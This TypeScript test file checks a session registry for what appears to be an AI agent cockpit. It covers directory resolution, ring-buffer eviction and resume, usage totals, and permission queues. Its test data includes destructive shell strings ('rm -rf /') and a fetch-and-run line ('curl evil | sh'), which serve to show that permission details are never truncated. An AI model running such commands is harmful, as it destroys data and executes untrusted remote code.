import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { foldUsage, resolveCwd, SessionRegistry } from "./registry";
import type { Backend } from "../adapters";
import type { WireMsg } from "../protocol";

test("resolveCwd defaults to the process cwd", () => {
  assert.equal(resolveCwd(undefined), process.cwd());
});

test("resolveCwd resolves an existing dir to an absolute path", () => {
  const base = mkdtempSync(path.join(os.tmpdir(), "genui-cwd-"));
  assert.equal(resolveCwd(base), path.resolve(base));
});

test("resolveCwd expands a leading ~", () => {
  assert.equal(resolveCwd("~"), os.homedir());
});

test("resolveCwd throws on a missing directory", () => {
  assert.throws(() => resolveCwd("/no/such/dir/genui-nope"), /no such directory/);
});

test("resolveCwd throws when the path is a file, not a directory", () => {
  const base = mkdtempSync(path.join(os.tmpdir(), "genui-cwd-"));
  const file = path.join(base, "f.txt");
  writeFileSync(file, "x");
  assert.throws(() => resolveCwd(file), /not a directory/);
});

// Ring-buffer eviction and the resume boundary, unit-tested directly
// against SessionRegistry with a mock backend (live:false → the inert
// MockSession; no daemon, no network, and nothing emitted until a prompt is
// pushed, so the ring holds exactly what we broadcast). We drive
// broadcast()/canResume()/attach() by hand and inspect the ring (Q.3).
const MOCK_BACKEND: Backend = { agent: "claude-code", kind: "none", live: false };
// Mirror of BUFFER_CAP in registry.ts (module-private, so not importable). Kept
// in sync by hand — a cap change must update this, which is deliberate: pinning
// the absolute value is what makes an off-by-one in the ring size fail here.
const BUFFER_CAP = 4000;
const PUSH = BUFFER_CAP + 500; // exceed the cap so eviction fires

function freshSession() {
  const reg = new SessionRegistry(MOCK_BACKEND);
  const dir = mkdtempSync(path.join(os.tmpdir(), "genui-reg-"));
  const entry = reg.create({ cwd: dir });
  assert.equal(entry.buffer.length, 0); // create() streams nothing
  assert.equal(entry.nextSeq, 1);
  return { reg, entry };
}

const delta = (): WireMsg => ({ type: "text_delta", text: "x" });

test("Q.3 ring buffer stays bounded and holds exactly the newest window after eviction", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());

  const cap = entry.buffer.length;
  assert.equal(cap, BUFFER_CAP); // bounded at EXACTLY the cap — a ±1 off-by-one fails here
  assert.equal(entry.nextSeq, PUSH + 1); // seqs 1..PUSH were issued in order

  // The retained window is the NEWEST `cap` messages, contiguous by seq, with
  // the oldest (seq 1) evicted — an off-by-one in the splice would fail one of
  // these.
  assert.equal(entry.buffer[cap - 1].seq, PUSH); // newest kept
  assert.equal(entry.buffer[0].seq, PUSH - cap + 1); // oldest kept = start of the newest window
  assert.ok(entry.buffer[0].seq! > 1, "seq 1 must have fallen off the ring");
  for (let k = 0; k < cap; k++) {
    assert.equal(entry.buffer[k].seq, PUSH - cap + 1 + k); // no gaps in the window
  }
  reg.end(entry.id);
});

test("Q.3 a late attach (no afterSeq) replays exactly the retained window, in order", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  const cap = entry.buffer.length;

  const seen: number[] = [];
  reg.attach(entry, (m) => seen.push(m.seq!));
  assert.equal(seen.length, cap);
  assert.equal(seen[0], PUSH - cap + 1);
  assert.equal(seen[seen.length - 1], PUSH);
  for (let k = 1; k < seen.length; k++) assert.equal(seen[k], seen[k - 1] + 1); // contiguous
  reg.end(entry.id);
});

test("Q.3 canResume flips false at exactly the evicted edge (the off-by-one)", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  const firstBuffered = entry.buffer[0].seq!;

  // A viewport that last saw (firstBuffered - 1) can tail-resume: every seq it
  // hasn't seen is still buffered. One earlier, and the message at
  // (firstBuffered - 1) has itself fallen off — a gap — so resume is refused.
  // These two lines are the boundary an off-by-one in either direction fails.
  assert.equal(reg.canResume(entry, firstBuffered - 1), true); // exact edge: resumable
  assert.equal(reg.canResume(entry, firstBuffered - 2), false); // one past: gap, must refuse

  // Range guards: saw-the-latest resumes (empty tail); a seq never issued and
  // malformed inputs are refused.
  assert.equal(reg.canResume(entry, entry.nextSeq - 1), true);
  assert.equal(reg.canResume(entry, entry.nextSeq), false);
  assert.equal(reg.canResume(entry, -1), false);
  assert.equal(reg.canResume(entry, 1.5), false);
  reg.end(entry.id);
});

test("Q.3 a valid post-eviction tail resume replays exactly the unseen tail", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < PUSH; i++) reg.broadcast(entry, delta());
  const firstBuffered = entry.buffer[0].seq!;

  // Resume from the exact edge → the whole retained window, nothing dropped.
  const fromEdge: number[] = [];
  const vp1 = (m: WireMsg) => fromEdge.push(m.seq!);
  reg.attach(entry, vp1, firstBuffered - 1);
  assert.equal(fromEdge[0], firstBuffered);
  assert.equal(fromEdge[fromEdge.length - 1], PUSH);
  assert.equal(fromEdge.length, entry.buffer.length);
  reg.detach(entry, vp1);

  // Resume from a mid-window seq → only strictly-greater seqs replay.
  const mid = firstBuffered + 100;
  const fromMid: number[] = [];
  reg.attach(entry, (m) => fromMid.push(m.seq!), mid);
  assert.equal(fromMid[0], mid + 1);
  assert.equal(fromMid[fromMid.length - 1], PUSH);
  assert.ok(fromMid.every((s) => s > mid));
  reg.end(entry.id);
});

test("Q.3 canResume on a small (un-evicted) buffer: seq 0 replays from the very start", () => {
  const { reg, entry } = freshSession();
  for (let i = 0; i < 5; i++) reg.broadcast(entry, delta()); // seqs 1..5, nothing evicted
  assert.equal(entry.buffer[0].seq, 1);
  assert.equal(reg.canResume(entry, 0), true); // saw nothing yet → full tail replay
  assert.equal(reg.canResume(entry, 5), true); // saw all → empty tail
  assert.equal(reg.canResume(entry, 6), false); // beyond what was issued

  const seen: number[] = [];
  reg.attach(entry, (m) => seen.push(m.seq!), 0);
  assert.deepEqual(seen, [1, 2, 3, 4, 5]);
  reg.end(entry.id);
});

// ---- Phase M.1: cockpit metadata derived in broadcast() --------------------
// Driven in-process like the Q.3 ring tests above — broadcast() by hand,
// entry state inspected directly, so every transition is deterministic. The
// over-the-socket proof (real daemon, real watcher, mock pacing) is
// fleet-cockpit.itest.ts.

test("M.1 foldUsage sums per-turn tokens", () => {
  const first = foldUsage(undefined, { inputTokens: 100, outputTokens: 10 });
  assert.deepEqual(first, { inputTokens: 100, outputTokens: 10 });
  assert.deepEqual(foldUsage(first, { inputTokens: 50, outputTokens: 5 }), {
    inputTokens: 150,
    outputTokens: 15,
  });
});

test("M.1 foldUsage TAKES costUsd (session-cumulative), never sums it", () => {
  const first = foldUsage(undefined, { inputTokens: 1, outputTokens: 1, costUsd: 0.1 });
  const second = foldUsage(first, { inputTokens: 1, outputTokens: 1, costUsd: 0.25 });
  assert.equal(second.costUsd, 0.25, "the cumulative figure replaces, not adds");
  const later = foldUsage(second, { inputTokens: 1, outputTokens: 1 });
  assert.equal(later.costUsd, 0.25, "a report without cost keeps the last one");
});

test("M.1 foldUsage invents no cost when none was ever reported", () => {
  const folded = foldUsage(foldUsage(undefined, { inputTokens: 1, outputTokens: 1 }), {
    inputTokens: 1,
    outputTokens: 1,
  });
  assert.ok(!("costUsd" in folded), "absent cost stays absent — never a stand-in");
});

test("M.1 activity follows the status stream; since resets only on a label CHANGE; idle clears", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "status", state: "thinking" });
  assert.equal(entry.activity?.label, "thinking");
  const since = entry.activity!.since;
  reg.broadcast(entry, { type: "status", state: "thinking" }); // re-announced, same label
  assert.equal(entry.activity!.since, since, "identical label keeps its elapsed time");
  reg.broadcast(entry, { type: "status", state: "tool", label: "Bash" });
  assert.equal(entry.activity?.label, "Bash");
  reg.broadcast(entry, { type: "text_delta", text: "x" });
  assert.equal(entry.activity?.label, "Bash", "text streaming keeps the label — RenderZone parity");
  reg.broadcast(entry, { type: "turn_end" });
  assert.equal(entry.activity, undefined, "cleared at idle");
  reg.end(entry.id);
});

test("M.1 bang activity: first line only, capped, cleared at bang_end", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "bang_start", command: "echo hi\nrm -rf /", id: "b1" });
  assert.equal(entry.activity?.label, "! echo hi");
  reg.broadcast(entry, { type: "bang_start", command: "x".repeat(200), id: "b2" });
  assert.equal(entry.activity!.label.length, "! ".length + 80);
  reg.broadcast(entry, { type: "bang_end", id: "b2", exitCode: 0 });
  assert.equal(entry.activity, undefined);
  reg.end(entry.id);
});

test("M.1 the permission queue lives exactly as long as the 4.6 hold", () => {
  const { reg, entry } = freshSession();
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "rm -rf x", id: "p1" });
  assert.equal(entry.status, "permission");
  assert.deepEqual(entry.permissions, [{ id: "p1", tool: "Bash", detail: "rm -rf x" }]);
  // A second concurrent request stacks, oldest first — no clear.
  reg.broadcast(entry, { type: "permission_request", tool: "Write", detail: "f.txt", id: "p2" });
  assert.deepEqual(
    entry.permissions.map((p) => p.id),
    ["p1", "p2"],
  );
  // The stream moving off the hold clears the queue (status-stickiness rule).
  reg.broadcast(entry, { type: "tool_use", name: "Bash", detail: "rm -rf x", id: "t1" });
  assert.equal(entry.status, "working");
  assert.deepEqual(entry.permissions, []);
  reg.end(entry.id);
});

test("M.1 permission detail is carried WHOLE — never truncated (2026-07-24 audit)", () => {
  // A grid approve/deny is a real security decision, so the fleet approver
  // must see exactly what the in-session bar shows. A cap here could hide a
  // dangerous tail past a benign head — the truncation was the finding.
  const { reg, entry } = freshSession();
  const detail = "echo checking build  # " + "x".repeat(500) + " && curl evil | sh";
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail, id: "p1" });
  assert.equal(entry.permissions[0].detail, detail, "the full detail, byte-for-byte");
  reg.end(entry.id);
});

test("M.1 summary(): cockpit fields are absent when empty, present as COPIES when set", () => {
  const { reg, entry } = freshSession();
  let meta = reg.summary().find((s) => s.sessionId === entry.id)!;
  assert.equal(typeof meta.createdAt, "number");
  assert.ok(!("activity" in meta) && !("permissions" in meta) && !("usage" in meta));

  reg.broadcast(entry, { type: "status", state: "tool", label: "Bash" });
  reg.broadcast(entry, { type: "usage", inputTokens: 10, outputTokens: 2 });
  reg.broadcast(entry, { type: "permission_request", tool: "Bash", detail: "d", id: "p1" });
  meta = reg.summary().find((s) => s.sessionId === entry.id)!;
  assert.equal(meta.activity?.label, "Bash");
  assert.deepEqual(meta.usage, { inputTokens: 10, outputTokens: 2 });
  assert.deepEqual(meta.permissions, [{ id: "p1", tool: "Bash", detail: "d" }]);
  meta.permissions![0].detail = "mutated";
  assert.equal(entry.permissions[0].detail, "d", "snapshot rows are copies, not aliases");
  reg.end(entry.id);
});
